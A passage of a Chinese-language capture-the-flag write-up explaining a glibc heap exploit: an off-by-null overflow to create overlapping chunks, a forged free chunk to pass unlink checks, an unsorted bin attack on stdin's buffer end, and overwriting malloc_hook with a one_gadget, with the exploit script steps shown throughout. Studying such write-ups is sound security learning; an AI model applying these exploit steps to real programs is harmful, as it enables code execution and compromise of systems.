然后初始化一下堆状态
    add_ghost(12345, "ssssssss")
    new_heap("b")   # heap 0
    new_heap("b")   # heap 1   
    new_heap("b")   # heap 2
现在的 `heap` 是这样的
然后构建一个较大的 `unsorted bin`
    remove_ghost()
    del_heap(0)
    del_heap(2)
    new_heap("s")
    new_heap("s")
    log.info("create unsorted bin: |heap 0|unsorted_bin(0x60)|heap 1|heap 2|top chunk|")
    # pause()
    del_heap(0)
    del_heap(1)
下面使用 `off-by-null` 进行攻击，先说说这种攻击为啥可以实现，文章开头就说， `new_heap` 时获取输入，最多可以读取 `0xa8`
个字节的数据，最后会在末尾添加 `0x00` ,所以实际上是 `0xa9` 字节 , 因为 `0xa8` 字节 时已经用完了 下一个 `chunk` 的
`presize` 区域 ， 第`0xa9`字节就会覆盖 下一个 `chunk` 的 `size` 位， 这就是 `off-by-null`,
具体细节比较复杂，下面一一道来。
首先触发 `off-by-one`
    new_heap("a"*0xa8)
可以看到，在调用 `malloc` 分配内存后， `heap_0` 在 `heap` 的开头分配，然后在 偏移 `0xb0` 位置处有一个 `0x110`
大小的 `unsorted bin`， 此时 `heap_2` 的 `pre_size` 为 `0x110`, `pre_inuse` 为 `0`。所以通过
`heap_2` 找到的 `pre chunk` 为 `0xb0` 处开始的 `0x110` 大小的 `chunk`.
然后 `off-by-null` 后， `unsorted bin` 的 `size` 域 变成了 `0x100` 这就造成了 `0x10` 大小的
`hole`.
`0x5555557571b0` 就是 hole.  
此时 `heap_2` 的 `pre_size` 与 `pre_inuse`没变化。
在清理下
    new_heap("s")
    del_heap(0)
    del_heap(1)
这里那两个 `unsorted bin` 不合并的原因是，系统判定下面那个 `unsorted bin` ，找到 hole 里面的 第二个
8字节，取它的最低位，为0表示已经释放，为1则未被释放。由于那里值 为 `0x3091` (不知道从哪来的）,所以系统会认为它还没有被释放。
此时 `heap_2` 的 `pre_size` 为 `0x110`, `pre_inuse` 为 `0`。如果我们释放掉 `heap2` ,系统根据
`pre_size` 找到 偏移 `0xb0` ，并且会认为 这个块已经释放（ `pre_inuse` 为 `0`）， 然后就会与 `heap2`
合并，这样就会有 `unsorted bin` 的交叉情况了。
要能成功 `free heap_2` 还需要 偏移 `0xb0` 处伪造一个 `free chunk` 来过掉 `unlink check`.
    # fake free chunk
    add_ghost(12345, p64(heap + 0xb0)*2)
    new_heap(p64(0)*8 + p64(0) + p64(0x111) + p64(heap) + p64(heap)) # 0
    new_heap("s")  #防止和 top chunk 合并
    del_heap(2)
首先分配 `ghost` ,它的 `fd` 和 `bk` 域都是 `偏移 0xb0` , 然后在 分配 `heap` ,在 伪造`偏移 0xb0`
`free chunk` , 使他的 `fd` 和 `bk` 都指向 `ghost` 所在块的基地址。  
这样就能过掉 `unlink` 的 检查  
然后 `del_heap(2)`, 获得一个 `0x1c0` 的 `unsorted bin` , 可以看到此时已经有 `free chunk`
的交叉情况了。
下一步，在交叉区域内构造 `unsorted bin`, 然后 分配内存，修改其中的 `bk` 进行 `unsorted bin`攻击
    del_heap(0)
    new_heap("s")  # 0
    new_heap("s")  # 2
    del_heap(0)
    del_heap(2)
首先释放掉 `heap0` 增加两个`heap`. ,会出现交叉的。原因有两个 `unsorted bin`.
然后分别释放 `heap 0`, `heap 2`,注意在释放 `heap 0` 的时候，由于画红圈标注的那个 `smallbin` 中的
`pre_inuse` 为 1， 所以 它上面的那个 `smallbin` 没有和 `unsorted bin` 合并， 原因在于，上一步
`new_heap("s") # 2` 时 ， 切割完后，剩下 `chunk` 开头正好是 画红圈标注的那个 `smallbin`, 就会设置 它的
`pre_inuse` 为 1。
最后我们有了两个 `unsorted bin`.再次分配 `heap` 时，会先分配到位于 `0x60`,大小为 `0xb0` 的 `unsorted
bin`,此时我们就可以修改 位于 `0xb0` 大小为 `0x1c0` 的 `unsorted bin`的首部，进而 进行 `unsorted bin`
攻击。
**unsorted bin attack**
现在我们已经有了 `unsorted bin` 攻击的能力了，目前我知道的攻击方式如下。
  * 修改 `global_max_fast` ，之后使用 `fastbin` 攻击, 条件不满足 （x）
  * house_of_orange , 新版 libc 校验 (x)
  * 修改 `stdin->_IO_base_end`, 修改 `malloc_hook`. ( ok )
在调用 `scanf` 获取输入时，首先会把输入的东西复制到 `[_IO_base_base, _IO_base_end]`, 最大大小为
`_IO_base_end - _IO_base_base`。  
修改 `unsorted bin` 的 `bck` 为 `_IO_base_end-0x10` ,就可以使
`_IO_base_end=main_arens+0x88`,我们就能修改很多东西了，而且 `malloc_hook` 就在这里面。
    # 修改 unsorted bin 
    new_heap(p64(0)*8 + p64(0) + p64(0xb1) + p64(0) + p64(buf_end-0x10))
    # 触发unsorted bin attack, 然后输入内容，修改 malloc_hook 为 magic
    new_heap(("\x00"*5 + p64(lock) + p64(0)*9 + p64(vtable)).ljust(0x1ad,"\x00")+ p64(magic))
注意 `unsorted bin` 的 `size` 域 一定要修改为 `0xb1`, 原因是 分配内存时如果 `smallbin`,
`fastbin`都不能分配，就会遍历 `unsorted bin` ,如果找到大小完全匹配的就直接返回，停止遍历，否则会持续性遍历，此时的 `bck`
已经被修改为 `_IO_base_end-0x10`, 如果遍历到这个, 会 `check` ,具体原因可以自行调试看。
我们接下来需要分配`heap` 大小 为 `0xb0`, 设置`size` 域为 `0xb1`， 会在 `unsorted bin`
第一次遍历后直接返回。不会报错。此时`unsorted bin`完成。
`magic` 可用 `one_gadget` 查找。  
最后 `del_heap(2)` 触发 `malloc`。
    # 此时 unsorted bin 已经损坏， del heap 2触发
    # 堆 unsorted bin的操作
    # 触发 malloc_printerr 
    # malloc_printerr 里面会调用 malloc 
    del_heap(2)
### 总结
这道题非常不错，不仅学到了利用 `file` 结构体的新型攻击方式，还可以通过这道题深入理解堆分配的流程。
### 参考